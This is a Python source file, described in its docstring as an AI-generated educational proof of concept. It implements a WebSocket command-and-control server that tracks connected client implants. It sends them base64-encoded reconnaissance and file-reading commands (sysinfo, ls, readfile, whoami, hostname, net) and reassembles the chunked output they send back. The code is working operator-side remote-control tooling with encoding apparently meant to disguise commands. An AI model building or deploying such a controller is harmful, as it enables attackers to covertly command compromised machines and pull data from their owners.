"""
server.py - WebSocket controller with job_id, chunk reassembly, and base64-encoded payloads.
Commands (sent as base64): echo, sysinfo, ls, readfile, whoami, hostname, net

Note: This is AI generated code provided as a proof of concept for educational purposes only.  

Run:
    python server.py
"""
import asyncio
import json
import logging
import uuid
import base64
from collections import defaultdict

import websockets
from websockets.exceptions import ConnectionClosedOK

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")

CONNECTED = {}  # client_id -> websocket
JOBS = defaultdict(lambda: {"chunks": {}, "received": 0, "final_seq": None, "meta": None})
DEFAULT_CHUNK_SIZE = 1024  # suggestion (4KB base64-string chunks)

async def handle_client(ws, path):
    client_id = None
    try:
        intro_raw = await asyncio.wait_for(ws.recv(), timeout=5)
        intro = json.loads(intro_raw)
        client_id = intro.get("client_id", f"unknown-{uuid.uuid4().hex[:6]}")
        CONNECTED[client_id] = ws
        logging.info("Client connected: %s", client_id)
        await ws.send(json.dumps({"type": "ack", "msg": "hello controller"}))
    except Exception as e:
        logging.warning("Connection failed during intro: %s", e)
        try:
            await ws.close()
        except:
            pass
        return

    try:
        async for raw in ws:
            try:
                msg = json.loads(raw)
            except Exception:
                logging.warning("Invalid JSON from %s: %s", client_id, raw)
                continue

            mtype = msg.get("type")
            if mtype == "heartbeat":
                logging.debug("Heartbeat from %s", client_id)
                continue

            if mtype == "result_chunk":
                job_id = msg.get("job_id")
                seq = int(msg.get("seq", 0))
                data_b64 = msg.get("data_b64", "")
                final = bool(msg.get("final", False))
                status = msg.get("status", "ok")
                meta = msg.get("meta", {})

                job = JOBS[job_id]
                if job["meta"] is None:
                    job["meta"] = meta
                job["chunks"][seq] = data_b64
                job["received"] += 1
                if final:
                    job["final_seq"] = seq
                logging.info("Received chunk for job %s from %s: seq=%d final=%s status=%s", job_id, client_id, seq, final, status)

                if job["final_seq"] is not None:
                    expected = job["final_seq"] + 1
                    if len(job["chunks"]) >= expected:
                        pieces = [job["chunks"][i] for i in range(expected)]
                        combined_b64 = "".join(pieces)
                        try:
                            combined_bytes = base64.b64decode(combined_b64.encode())
                            text = combined_bytes.decode(errors="replace")
                        except Exception as e:
                            text = f"<decode error: {e}>"
                            combined_bytes = b""
                        logging.info("Job %s completed from %s; output length=%d bytes", job_id, client_id, len(combined_bytes))
                        print("\n=== JOB RESULT ===")
                        print(f"client: {client_id}")
                        print(f"job_id: {job_id}")
                        print("meta:", job["meta"])
                        print("output:\n")
                        print(text)
                        print("==================\n")
                        del JOBS[job_id]
                continue

            logging.info("Message from %s: %s", client_id, msg)

    except ConnectionClosedOK:
        logging.info("Client %s disconnected", client_id)
    except Exception as e:
        logging.exception("Error with client %s: %s", client_id, e)
    finally:
        CONNECTED.pop(client_id, None)


async def interactive_console():
    help_text = (
        "Commands:\n"
        "  list\n"
        "  send <client_id> <cmd> [arg_text]        - cmd and arg will be base64-encoded (cmd names: echo, sysinfo, ls, readfile, whoami, hostname, net)\n"
        "  sendfile <client_id> readfile <local_path> - read local file and send bytes as arg\n"
        "  exit\n"
    )
    print(help_text)
    loop = asyncio.get_event_loop()
    while True:
        try:
            cmdline = await loop.run_in_executor(None, input, "controller> ")
        except (EOFError, KeyboardInterrupt):
            print("Exiting console.")
            break
        if not cmdline:
            continue
        parts = cmdline.strip().split()
        if not parts:
            continue
        cmd = parts[0].lower()
        if cmd == "list":
            if CONNECTED:
                for k in CONNECTED.keys():
                    print("-", k)
            else:
                print("No connected clients")
        elif cmd == "send" and len(parts) >= 3:
            client = parts[1]
            ccmd = parts[2]
            arg_text = " ".join(parts[3:]) if len(parts) > 3 else ""
            ws = CONNECTED.get(client)
            if not ws:
                print("Client not connected:", client)
                continue
            job_id = uuid.uuid4().hex
            # base64 encode command name and arg bytes
            cmd_b64 = base64.b64encode(ccmd.encode()).decode()
            arg_b64 = base64.b64encode(arg_text.encode()).decode()
            payload = {
                "type": "command",
                "job_id": job_id,
                "cmd_b64": cmd_b64,
                "arg_b64": arg_b64,
                "chunk_size": DEFAULT_CHUNK_SIZE
            }
            try:
                await ws.send(json.dumps(payload))
                print(f"Sent command {ccmd} to {client} job_id={job_id}")
            except Exception as e:
                print("Send failed:", e)
        elif cmd == "sendfile" and len(parts) == 4:
            client = parts[1]
            ccmd = parts[2]
            local_path = parts[3]
            ws = CONNECTED.get(client)
            if not ws:
                print("Client not connected:", client)
                continue
            try:
                with open(local_path, "rb") as f:
                    data = f.read()
                arg_b64 = base64.b64encode(data).decode()
                job_id = uuid.uuid4().hex
                cmd_b64 = base64.b64encode(ccmd.encode()).decode()
                payload = {
                    "type": "command",
                    "job_id": job_id,
                    "cmd_b64": cmd_b64,
                    "arg_b64": arg_b64,
                    "chunk_size": DEFAULT_CHUNK_SIZE
                }
                await ws.send(json.dumps(payload))
                print(f"Sent command {ccmd} (file {local_path}) to {client} job_id={job_id}")
            except Exception as e:
                print("Failed to read/send file:", e)
        elif cmd == "exit":
            print("Shutting down controller...")
            for w in list(CONNECTED.values()):
                try:
                    await w.close()
                except:
                    pass
            asyncio.get_event_loop().stop()
            return
        else:
            print(help_text)


async def main():
    server = await websockets.serve(handle_client, "127.0.0.1", 8765)
    print("Controller listening on ws://127.0.0.1:8765")
    await interactive_console()
    server.close()
    await server.wait_closed()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("Controller stopped")
